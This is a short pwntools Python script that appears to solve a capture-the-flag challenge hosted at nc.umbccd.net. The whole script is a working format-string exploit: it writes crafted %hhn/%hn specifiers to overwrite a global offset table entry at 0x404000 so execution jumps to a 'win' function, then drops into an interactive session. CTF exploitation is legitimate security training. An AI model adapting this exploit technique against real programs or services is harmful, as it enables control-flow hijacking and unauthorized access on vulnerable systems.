#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('out', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
# nc nc.umbccd.net 8925
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*0x4012bf
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('nc.umbccd.net', 8925)
else:
    p = process([exe.path])
GDB()
# input()
win = 0x401196
load = flat(
    f'%{0x96}c%9$hhn',
    f'%{0x4011-0x96}c%11$hn',
)
load = load.ljust(0x18, b'\0')
    
load += flat(
    0x404000,
    0x404000+1,
    0x404000+1

    )

sl(load)

p.interactive()
